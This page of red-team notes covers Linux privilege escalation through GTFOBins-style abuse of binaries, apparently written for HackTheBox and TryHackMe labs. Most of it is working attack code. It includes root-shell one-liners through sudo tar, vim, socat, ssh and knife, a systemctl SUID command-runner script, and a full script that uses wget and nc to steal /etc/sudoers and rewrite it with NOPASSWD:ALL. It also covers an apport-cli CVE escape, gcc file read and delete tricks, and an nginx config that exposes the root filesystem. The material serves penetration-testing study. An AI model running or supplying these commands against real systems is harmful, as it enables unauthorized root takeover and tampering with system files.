# GTFOBins

<div class="row row-cols-lg-2"><div>

[GTFOBins](https://gtfobins.github.io/) <small>(10.0k ⭐)</small> a.k.a. "Get The Fuck Out" is a list of way to exploit binaries such as `sed`/`tar`/... to get a higher level of privileges.

Common use cases are:

* [Binary was given SUID/GUID permissions](/cybersecurity/red-team/s4.privesc/linux/topics/perms.md#suidguid-bit)
* [Binary was given capabilities](/cybersecurity/red-team/s4.privesc/linux/topics/perms.md#capabilities)
* [User was granted sudo permission to binary](/cybersecurity/red-team/s4.privesc/linux/topics/sudo.md)
* ...

Note that not every exploit may pop a shell. Some only allow you to edit some files, which may help getting root.
</div><div>

**Example** 🔥

You can only run `tar` using `sudo`. Run the command below from [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo), and you will get a root shell.

```ps
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

➡️ You can use [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup) <small>(0.3k ⭐)</small> for offline browsing.

➡️ You may need/want to create a [root bash](/cybersecurity/red-team/s4.privesc/linux/utils/rootbash.md).
</div></div>

<hr class="sep-both">

## ⚡ SUID `systemctl` script

Description: this script makes it easier to run several commands using `systemctl`.

<div class="row row-cols-md-2 mt-4"><div>

Create a file `script.sh` with the contents below

```ps
TF=$(mktemp).service
echo "[Service]
Type=oneshot
ExecStart=/bin/sh -c '$@ > /tmp/output'
[Install]
WantedBy=multi-user.target" > $TF
systemctl -f link $TF
systemctl -f enable --now $TF
cat /tmp/output
```
</div><div>

Calls

```ps
$ chmod +x script.sh
$ ./script.sh id
$ ./script.sh ls -laR /root
```
</div></div>

<hr class="sep-both">

## ⚡ SUDO `wget` script

Description: this script automate privilege escalation using `wget`.

<div class="row row-cols-lg-2"><div class="align-self-center">

It's quite easy to do it manually, but you need two machines (ex: your VM and the target). This script is complex because everything is done locally, without interacting with your VM!

* Will use `wget` to fetch `/etc/sudoers` and `nc` to grab the result

* Then, it will replace the line giving access to `wget` and give you the permission to run every command as root

* Then, we will start a python web server, and use `wget` with `-o` to replace our new sudo file with the tampered one.

* Finally, the script run `sudo bash` and open your shell as root

⚠️ The script may mess with your [sudoers](/operating-systems/linux/env/files/index.md#etcsudoers) file if something goes wrong. I destroyed my VM 7 times before managing to make the script work 🌳. If you understand the commands used in the script, use them one by one, and check the tampered sudoers file (output) BEFORE overriding the current one.
</div><div>

```bash!
file=/etc/sudoers
port=4444
# todo: use mktemp
output=stolenfile

# Working in /tmp
cd /tmp
# -d and -q 0 to quit when connection is closed
nc -dlnp $port -q 0 > $output &
# -q = quiet, and -T 1 = close after one second
sudo wget -q --post-file=$file localhost:$port -T 1
# remove the HTTP headers
sed -i '1,9d' $output
# replace the command with find
sed -i "s/\($(whoami).*\)/$(whoami)  ALL=(ALL) NOPASSWD:ALL/g" $output
# create a web server
python3 -m http.server $port &
pid=$(echo $!)
sleep 1 # let the webserver start
# get the file then kill the webserver
# replace /etc/sudoers
sudo wget -q localhost:$port/$output -O $file && kill $pid
# open the root shell
sudo bash
```
</div></div>

<hr class="sep-both">

## Random Payloads

<div class="row row-cols-lg-2"><div>

If we are allowed to run a command as sudo:

* Common commands

```ps
$ sudo vim -c ':!/bin/sh'
$ sudo socat stdin exec:/bin/bash
$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

* [apport-cli](https://manpages.ubuntu.com/manpages/focal/en/man1/apport-cli.1.html) 2.26.0 and earlier has a vulnerability ([CVE-2023-1326](https://nvd.nist.gov/vuln/detail/CVE-2023-1326)) 

[![devvortex](../../../../_badges/htb-p/devvortex.svg)](https://app.hackthebox.com/machines/Devvortex)

```ps
$ sudo /usr/bin/apport-cli --file-bug
> 1
> 2
> F # any key
> V # view report (open less)
:!/bin/bash
```

* `/usr/bin/systemctl status xxx.service`
* `/bin/systemctl daemon-reload`

[![attacking_common_applications](../../../../_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
[![vulnnet_node](../../../../_badges/thm-p/vulnnet_node.svg)](https://tryhackme.com/r/room/vulnnetnode)
[![sau](../../../../_badges/htb-p/sau.svg)](https://app.hackthebox.com/machines/Sau)

While it may be secure, if a reader is opened, such as `less`, it may be leveraged to run commands e.g. using `!/bin/bash` for `less`.

Otherwise, if you can reload services, then find if there is a service you can edit, edit it, and reload them.

* gcc special usages

```shell!
$ gcc -x c /etc/passwd             # read file
$ gcc -Xlinker -o/tmp/denylist.txt # delete file
```
</div><div>

* `/usr/bin/knife`: [knife](http://manpages.ubuntu.com/manpages/bionic/man1/knife.1.html) can be exploited in many ways

[![knife](../../../../_badges/htb-p/knife.svg)](https://app.hackthebox.com/machines/Knife)

```ps
$ sudo knife environment edit _default -e vim # -> sudo vim
$ sudo knife environment edit _default -e rootbash.sh
$ sudo knife exec --exec "exec '/bin/sh -i'"
$ echo -n 'exec "/bin/bash -i"' > config.rb
$ sudo knife user list -c config.rb
```

* `nginx` can be used to read files. It may also be used to write files using `dav_methods PUT;`. For instance, adding an entry in authorized keys or sudoers.

[![broker](../../../../_badges/htb-p/broker.svg)](https://app.hackthebox.com/machines/Broker)

```ps
$ cat $(pwd)/test.conf
user root;
# each URL is injected in LD PRELOAD
# leading to the execution of junk then our custom .so
# error_log /etc/ld.so.preload warn;
events {
    worker_connections 1024;
}
http {
    server {
       listen 80;
       root /;
       autoindex on;
       # dav_methods PUT;
    }
}
$ sudo /path/to/nginx -s stop
$ sudo /path/to/nginx -c $(pwd)/test.conf
```
</div></div>